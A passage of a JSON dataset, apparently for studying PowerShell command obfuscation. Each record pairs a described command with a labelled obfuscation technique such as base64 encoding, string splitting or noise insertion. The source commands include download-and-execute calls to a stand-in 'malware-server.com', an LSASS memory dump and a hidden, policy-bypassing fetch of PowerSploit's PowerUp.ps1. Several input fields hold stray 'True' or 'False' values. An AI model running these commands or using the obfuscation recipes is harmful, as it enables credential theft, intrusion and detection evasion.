    "origin_cmd": "Invoke-Expression -Command (New-Object Net.WebClient).DownloadString('http://malware-server.com/rootFile.ps1')"
  },
  {
    "input": ": The: Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command (New-Object Net.WebClient).DownloadString('http://malware-server.com/rootFile.ps1')"
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command (New-Object Net.WebClient).DownloadString('http://malware-server.com/rootFile.ps1')"
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command (New-Object Net.WebClient).DownloadString('http://malware-server.com/rootFile.ps1')"
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command (New-Object Net.WebClient).DownloadString('http://malware-server.com/rootFile.ps1')"
  },
  {
    "input": ": The: Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command (New-Object Net.WebClient).DownloadString('http://malware-server.com/rootFile.ps1')"
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command (New-Object Net.WebClient).DownloadString('http://malware-server.com/rootFile.ps1')"
  },
  {
    "input": "Retrieve Active Directory objects based on a specified LDAP filter and server.",
    "output": "Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=${uacProp})' -Server ${dmn}",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Retrieve Active Directory objects based on a specified LDAP filter and server.",
    "origin_cmd": "Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=${uacProp})' -Server ${dmn}"
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve Active Directory objects based on a specified LDAP filter and server.",
    "origin_cmd": "Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=${uacProp})' -Server ${dmn}"
  },
  {
    "input": "Retrieve Active Directory objects based on a specified LDAP filter and server.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Retrieve Active Directory objects based on a specified LDAP filter and server.",
    "origin_cmd": "Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=${uacProp})' -Server ${dmn}"
  },
  {
    "input": "Retrieve Active Directory objects based on a specified LDAP filter and server.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve Active Directory objects based on a specified LDAP filter and server.",
    "origin_cmd": "Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=${uacProp})' -Server ${dmn}"
  },
  {
    "input": "Retrieve Active Directory objects based on a specified LDAP filter and server.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Retrieve Active Directory objects based on a specified LDAP filter and server.",
    "origin_cmd": "Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=${uacProp})' -Server ${dmn}"
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve Active Directory objects based on a specified LDAP filter and server.",
    "origin_cmd": "Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=${uacProp})' -Server ${dmn}"
  },
  {
    "input": "Retrieve Active Directory objects based on a specified LDAP filter and server.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Retrieve Active Directory objects based on a specified LDAP filter and server.",
    "origin_cmd": "Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=${uacProp})' -Server ${dmn}"
  },
  {
    "input": "Retrieve Active Directory objects based on a specified LDAP filter and server.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve Active Directory objects based on a specified LDAP filter and server.",
    "origin_cmd": "Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=${uacProp})' -Server ${dmn}"
  },
  {
    "input": "Retrieve Active Directory objects based on a specified LDAP filter and server.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Retrieve Active Directory objects based on a specified LDAP filter and server.",
    "origin_cmd": "Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=${uacProp})' -Server ${dmn}"
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve Active Directory objects based on a specified LDAP filter and server.",
    "origin_cmd": "Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=${uacProp})' -Server ${dmn}"
  },
  {
    "input": "Retrieve Active Directory objects based on a specified LDAP filter and server.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve Active Directory objects based on a specified LDAP filter and server.",
    "origin_cmd": "Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=${uacProp})' -Server ${dmn}"
  },
  {
    "input": "Retrieve Active Directory objects based on a specified LDAP filter and server.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve Active Directory objects based on a specified LDAP filter and server.",
    "origin_cmd": "Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=${uacProp})' -Server ${dmn}"
  },
  {
    "input": "Retrieve Active Directory objects based on a specified LDAP filter and server.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve Active Directory objects based on a specified LDAP filter and server.",
    "origin_cmd": "Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=${uacProp})' -Server ${dmn}"
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve Active Directory objects based on a specified LDAP filter and server.",
    "origin_cmd": "Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=${uacProp})' -Server ${dmn}"
  },
  {
    "input": "Retrieve Active Directory objects based on a specified LDAP filter and server.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve Active Directory objects based on a specified LDAP filter and server.",
    "origin_cmd": "Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=${uacProp})' -Server ${dmn}"
  },
  {
    "input": "Retrieve Active Directory objects based on a specified LDAP filter and server.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve Active Directory objects based on a specified LDAP filter and server.",
    "origin_cmd": "Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=${uacProp})' -Server ${dmn}"
  },
  {
    "input": "Dump the memory of the lsass process using Out-Minidump.",
    "output": "Get-Process lsass | Out-Minidump",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Dump the memory of the lsass process using Out-Minidump.",
    "origin_cmd": "Get-Process lsass | Out-Minidump"
  },
  {
    "input": "False",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Dump the memory of the lsass process using Out-Minidump.",
    "origin_cmd": "Get-Process lsass | Out-Minidump"
  },
  {
    "input": "Dump the memory of the lsass process using Out-Minidump.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Dump the memory of the lsass process using Out-Minidump.",
    "origin_cmd": "Get-Process lsass | Out-Minidump"
  },
  {
    "input": "False",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Dump the memory of the lsass process using Out-Minidump.",
    "origin_cmd": "Get-Process lsass | Out-Minidump"
  },
  {
    "input": "Dump the memory of the lsass process using Out-Minidump.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Dump the memory of the lsass process using Out-Minidump.",
    "origin_cmd": "Get-Process lsass | Out-Minidump"
  },
  {
    "input": "False",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Dump the memory of the lsass process using Out-Minidump.",
    "origin_cmd": "Get-Process lsass | Out-Minidump"
  },
  {
    "input": "Dump the memory of the lsass process using Out-Minidump.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Dump the memory of the lsass process using Out-Minidump.",
    "origin_cmd": "Get-Process lsass | Out-Minidump"
  },
  {
    "input": "False",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Dump the memory of the lsass process using Out-Minidump.",
    "origin_cmd": "Get-Process lsass | Out-Minidump"
  },
  {
    "input": "Dump the memory of the lsass process using Out-Minidump.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Dump the memory of the lsass process using Out-Minidump.",
    "origin_cmd": "Get-Process lsass | Out-Minidump"
  },
  {
    "input": "False",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Dump the memory of the lsass process using Out-Minidump.",
    "origin_cmd": "Get-Process lsass | Out-Minidump"
  },
  {
    "input": "Dump the memory of the lsass process using Out-Minidump.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Dump the memory of the lsass process using Out-Minidump.",
    "origin_cmd": "Get-Process lsass | Out-Minidump"
  },
  {
    "input": "False",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Dump the memory of the lsass process using Out-Minidump.",
    "origin_cmd": "Get-Process lsass | Out-Minidump"
  },
  {
    "input": "Dump the memory of the lsass process using Out-Minidump.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Dump the memory of the lsass process using Out-Minidump.",
    "origin_cmd": "Get-Process lsass | Out-Minidump"
  },
  {
    "input": "False",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Dump the memory of the lsass process using Out-Minidump.",
    "origin_cmd": "Get-Process lsass | Out-Minidump"
  },
  {
    "input": "Dump the memory of the lsass process using Out-Minidump.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Dump the memory of the lsass process using Out-Minidump.",
    "origin_cmd": "Get-Process lsass | Out-Minidump"
  },
  {
    "input": "False",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Dump the memory of the lsass process using Out-Minidump.",
    "origin_cmd": "Get-Process lsass | Out-Minidump"
  },
  {
    "input": "Copy a file from a remote system to a local temporary directory.",
    "output": "copy-item -Path \"\\${remote}\\C$${share_file}\" -Destination \"$Env:TEMP${local_file}\"",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Copy a file from a remote system to a local temporary directory.",
    "origin_cmd": "copy-item -Path \"\\${remote}\\C$${share_file}\" -Destination \"$Env:TEMP${local_file}\""
  },
  {
    "input": "copy a file from a remote system to a local temporary directory .",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Copy a file from a remote system to a local temporary directory.",
    "origin_cmd": "copy-item -Path \"\\${remote}\\C$${share_file}\" -Destination \"$Env:TEMP${local_file}\""
  },
  {
    "input": "Copy a file from a remote system to a local temporary directory.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Copy a file from a remote system to a local temporary directory.",
    "origin_cmd": "copy-item -Path \"\\${remote}\\C$${share_file}\" -Destination \"$Env:TEMP${local_file}\""
  },
  {
    "input": "copy a file from a remote system to a local temporary directory .",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Copy a file from a remote system to a local temporary directory.",
    "origin_cmd": "copy-item -Path \"\\${remote}\\C$${share_file}\" -Destination \"$Env:TEMP${local_file}\""
  },
  {
    "input": "Copy a file from a remote system to a local temporary directory.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Copy a file from a remote system to a local temporary directory.",
    "origin_cmd": "copy-item -Path \"\\${remote}\\C$${share_file}\" -Destination \"$Env:TEMP${local_file}\""
  },
  {
    "input": "copy a file from a remote system to a local temporary directory .",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Copy a file from a remote system to a local temporary directory.",
    "origin_cmd": "copy-item -Path \"\\${remote}\\C$${share_file}\" -Destination \"$Env:TEMP${local_file}\""
  },
  {
    "input": "Copy a file from a remote system to a local temporary directory.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Copy a file from a remote system to a local temporary directory.",
    "origin_cmd": "copy-item -Path \"\\${remote}\\C$${share_file}\" -Destination \"$Env:TEMP${local_file}\""
  },
  {
    "input": "copy a file from a remote system to a local temporary directory .",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Copy a file from a remote system to a local temporary directory.",
    "origin_cmd": "copy-item -Path \"\\${remote}\\C$${share_file}\" -Destination \"$Env:TEMP${local_file}\""
  },
  {
    "input": "Copy a file from a remote system to a local temporary directory.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Copy a file from a remote system to a local temporary directory.",
    "origin_cmd": "copy-item -Path \"\\${remote}\\C$${share_file}\" -Destination \"$Env:TEMP${local_file}\""
  },
  {
    "input": "copy a file from a remote system to a local temporary directory .",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Copy a file from a remote system to a local temporary directory.",
    "origin_cmd": "copy-item -Path \"\\${remote}\\C$${share_file}\" -Destination \"$Env:TEMP${local_file}\""
  },
  {
    "input": "Copy a file from a remote system to a local temporary directory.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Copy a file from a remote system to a local temporary directory.",
    "origin_cmd": "copy-item -Path \"\\${remote}\\C$${share_file}\" -Destination \"$Env:TEMP${local_file}\""
  },
  {
    "input": "copy a file from a remote system to a local temporary directory .",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Copy a file from a remote system to a local temporary directory.",
    "origin_cmd": "copy-item -Path \"\\${remote}\\C$${share_file}\" -Destination \"$Env:TEMP${local_file}\""
  },
  {
    "input": "Copy a file from a remote system to a local temporary directory.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Copy a file from a remote system to a local temporary directory.",
    "origin_cmd": "copy-item -Path \"\\${remote}\\C$${share_file}\" -Destination \"$Env:TEMP${local_file}\""
  },
  {
    "input": "copy a file from a remote system to a local temporary directory .",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Copy a file from a remote system to a local temporary directory.",
    "origin_cmd": "copy-item -Path \"\\${remote}\\C$${share_file}\" -Destination \"$Env:TEMP${local_file}\""
  },
  {
    "input": "Copy a file from a remote system to a local temporary directory.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Copy a file from a remote system to a local temporary directory.",
    "origin_cmd": "copy-item -Path \"\\${remote}\\C$${share_file}\" -Destination \"$Env:TEMP${local_file}\""
  },
  {
    "input": "copy a file from a remote system to a local temporary directory .",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Copy a file from a remote system to a local temporary directory.",
    "origin_cmd": "copy-item -Path \"\\${remote}\\C$${share_file}\" -Destination \"$Env:TEMP${local_file}\""
  },
  {
    "input": "Append the output of the \"tasklist /m\" command to a log file and then display the content of the log file.",
    "output": "tasklist /m >> $env:APPDATA\\vmtool.log; ; cat $env:APPDATA\\vmtool.log",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Append the output of the \"tasklist /m\" command to a log file and then display the content of the log file.",
    "origin_cmd": "tasklist /m >> $env:APPDATA\\vmtool.log; ; cat $env:APPDATA\\vmtool.log"
  },
  {
    "input": "False",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Append the output of the \"tasklist /m\" command to a log file and then display the content of the log file.",
    "origin_cmd": "tasklist /m >> $env:APPDATA\\vmtool.log; ; cat $env:APPDATA\\vmtool.log"
  },
  {
    "input": "Append the output of the \"tasklist /m\" command to a log file and then display the content of the log file.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Append the output of the \"tasklist /m\" command to a log file and then display the content of the log file.",
    "origin_cmd": "tasklist /m >> $env:APPDATA\\vmtool.log; ; cat $env:APPDATA\\vmtool.log"
  },
  {
    "input": "False",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Append the output of the \"tasklist /m\" command to a log file and then display the content of the log file.",
    "origin_cmd": "tasklist /m >> $env:APPDATA\\vmtool.log; ; cat $env:APPDATA\\vmtool.log"
  },
  {
    "input": "Append the output of the \"tasklist /m\" command to a log file and then display the content of the log file.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Append the output of the \"tasklist /m\" command to a log file and then display the content of the log file.",
    "origin_cmd": "tasklist /m >> $env:APPDATA\\vmtool.log; ; cat $env:APPDATA\\vmtool.log"
  },
  {
    "input": "False",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Append the output of the \"tasklist /m\" command to a log file and then display the content of the log file.",
    "origin_cmd": "tasklist /m >> $env:APPDATA\\vmtool.log; ; cat $env:APPDATA\\vmtool.log"
  },
  {
    "input": "Append the output of the \"tasklist /m\" command to a log file and then display the content of the log file.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Append the output of the \"tasklist /m\" command to a log file and then display the content of the log file.",
    "origin_cmd": "tasklist /m >> $env:APPDATA\\vmtool.log; ; cat $env:APPDATA\\vmtool.log"
  },
  {
    "input": "False",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Append the output of the \"tasklist /m\" command to a log file and then display the content of the log file.",
    "origin_cmd": "tasklist /m >> $env:APPDATA\\vmtool.log; ; cat $env:APPDATA\\vmtool.log"
  },
  {
    "input": "Append the output of the \"tasklist /m\" command to a log file and then display the content of the log file.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Append the output of the \"tasklist /m\" command to a log file and then display the content of the log file.",
    "origin_cmd": "tasklist /m >> $env:APPDATA\\vmtool.log; ; cat $env:APPDATA\\vmtool.log"
  },
  {
    "input": "False",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Append the output of the \"tasklist /m\" command to a log file and then display the content of the log file.",
    "origin_cmd": "tasklist /m >> $env:APPDATA\\vmtool.log; ; cat $env:APPDATA\\vmtool.log"
  },
  {
    "input": "Append the output of the \"tasklist /m\" command to a log file and then display the content of the log file.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Append the output of the \"tasklist /m\" command to a log file and then display the content of the log file.",
    "origin_cmd": "tasklist /m >> $env:APPDATA\\vmtool.log; ; cat $env:APPDATA\\vmtool.log"
  },
  {
    "input": "False",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Append the output of the \"tasklist /m\" command to a log file and then display the content of the log file.",
    "origin_cmd": "tasklist /m >> $env:APPDATA\\vmtool.log; ; cat $env:APPDATA\\vmtool.log"
  },
  {
    "input": "Append the output of the \"tasklist /m\" command to a log file and then display the content of the log file.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Append the output of the \"tasklist /m\" command to a log file and then display the content of the log file.",
    "origin_cmd": "tasklist /m >> $env:APPDATA\\vmtool.log; ; cat $env:APPDATA\\vmtool.log"
  },
  {
    "input": "False",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Append the output of the \"tasklist /m\" command to a log file and then display the content of the log file.",
    "origin_cmd": "tasklist /m >> $env:APPDATA\\vmtool.log; ; cat $env:APPDATA\\vmtool.log"
  },
  {
    "input": "Append the output of the \"tasklist /m\" command to a log file and then display the content of the log file.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Append the output of the \"tasklist /m\" command to a log file and then display the content of the log file.",
    "origin_cmd": "tasklist /m >> $env:APPDATA\\vmtool.log; ; cat $env:APPDATA\\vmtool.log"
  },
  {
    "input": "False",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Append the output of the \"tasklist /m\" command to a log file and then display the content of the log file.",
    "origin_cmd": "tasklist /m >> $env:APPDATA\\vmtool.log; ; cat $env:APPDATA\\vmtool.log"
  },
  {
    "input": "Download and execute the PowerUp.ps1 script from the PowerSploit GitHub repository with hidden window and bypassing execution policy.",
    "output": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1')\"",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Download and execute the PowerUp.ps1 script from the PowerSploit GitHub repository with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1')\""
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute the PowerUp.ps1 script from the PowerSploit GitHub repository with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1')\""
  },
  {
    "input": "False",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute the PowerUp.ps1 script from the PowerSploit GitHub repository with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1')\""
  },
  {
    "input": "Download and execute the PowerUp.ps1 script from the PowerSploit GitHub repository with hidden window and bypassing execution policy.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute the PowerUp.ps1 script from the PowerSploit GitHub repository with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1')\""
  },
  {
    "input": "Download and execute the PowerUp.ps1 script from the PowerSploit GitHub repository with hidden window and bypassing execution policy.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute the PowerUp.ps1 script from the PowerSploit GitHub repository with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1')\""
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute the PowerUp.ps1 script from the PowerSploit GitHub repository with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1')\""
  },
  {
    "input": "False",
